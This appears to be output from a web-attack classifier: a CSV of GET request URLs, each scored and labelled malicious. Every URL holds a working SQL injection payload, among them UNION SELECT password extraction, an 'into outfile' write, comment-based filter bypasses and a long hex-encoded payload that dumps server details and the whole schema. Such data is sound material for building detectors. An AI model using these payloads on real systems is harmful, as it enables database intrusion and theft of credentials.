Method,length,content,URL,Predicted_Probability,Predicted_Label
GET,0,,/?p=%00%27%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20username-%27%27foobar%27%27--,1.0,1
GET,0,,/?p=%00%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20username-%27tom%27--,1.0,1
GET,0,,/?p=%0A%0d%2Bselect%2Buser%2Bfrom%2Bdual%2B%0A%0D,0.9671134,1
GET,0,,/?p=%0Aselect%200x00%2C%200x41%20like/%2A%2131337table_name%2A/%2C3%20from%20information_schema.tables%20limit%201,0.9999995,1
GET,0,,/?p=%0Aselect%200x00%2C%200x41%20not%20like%2F%2A%2100000table_name%2A%2F%2C3%20from%20information_schema.tables%20limit%201,0.9999995,1
GET,0,,/?p=0%2Bdiv%2B1%2Bunion%23foo%2A%2F%2Abar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user,0.9999995,1
GET,0,,/?p=1%09and%091%3D1%09--,0.99565244,1
GET,0,,/?p=1%0Aand%0A1%3D1%0A--,0.99314815,1
GET,0,,/?p=1%0Band%0B1%3D1%0B--,0.99020386,1
GET,0,,/?p=1%0Cand%0C1%3D1%0C--,0.9914028,1
GET,0,,/?p=1%0Dand%0D1%3D1%0D--,0.9953242,1
GET,0,,/?p=1%20%7C%7C%201%20%3D%201%20into%20outfile%20%27result.txt%27,0.99920815,1
GET,0,,/?p=%28/%2A%2112345sELecT%2A/%28%40%29from%28/%2A%2112345sELecT%2A/%28%40%3A%3D0x00%29%2C%28/%2A%2112345sELecT%2A/%28%40%29from%28%60InFoRMAtiON_sCHeMa%60.%60ColUMNs%60%29where%28%60TAblE_sCHemA%60%3DDatAbAsE/%2Adata%2A/%28%29%29and%28%40%29in%28%40%3A%3DCoNCat%0a%28%40%2C0x3c62723e5461626c6520466f756e64203a20%2CTaBLe_nAMe%2C0x3a3a%2Ccolumn_name%29%29%29%29a%29,1.0,1
GET,0,,/?p=/%2A%2112345union%20select%2A/,0.99999833,1
GET,0,,/?p=%2B/%2A%2113337concat%2A/%280x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e%2Cdatabase/%2A%2AN1Z4M%2A%2A/%28%29%2C0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e%2C%40%40version%2C0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e%2Cuser/%2A%2AN1Z4M%2A%2A/%28%29%2C0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e%2C%40%40port%2C0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e%2C%40%40version_compile_os%2C0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e%2C%40%40datadir%2C0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e%2CUUID/%2A%2AN1Z4M%2A%2A/%28%29%2C0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e%2Ccurrent_user/%2A%2AN1Z4M%2A%2A/%28%29%2C0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e%2C%40%40tmpdir%2C0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e%2C%40%40version_compile_machine%2C0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e%2C%40%40CHARACTER_SET_FILESYSTEM%2C0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e%2C%40%40hostname%2C0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e%2CUUID/%2A%2AN1Z4M%2A%2A/%28%29%2C0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e%2C%40%40GLOBAL.have_symlink%2C0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e%2C%40%40GLOBAL.have_ssl%2C0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e%2C%40%40basedir%2C0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e%2C%28/%2A%2113337select%2A/%28%40a%29/%2A%2113337from%2A/%28/%2A%2113337select%2A/%28%40a%3A%3D0x00%29%2C%28/%2A%2113337select%2A/%28%40a%29/%2A%2113337from%2A/%28information_schema.columns%29/%2A%2113337where%2A/%28table_schema%21%3D0x696e666f726d6174696f6e5f736368656d61%29and%28%40a%29in%28%40a%3A%3D/%2A%2113337concat%2A/%28%40a%2Ctable_schema%2C0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e%2Ctable_name%2C0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e%2Ccolumn_name%2C0x3c62723e%29%29%29%29a%29%29%2B,1.0,1
GET,0,,/?p=/%2A%2113337union%20select%2A/,0.99999917,1
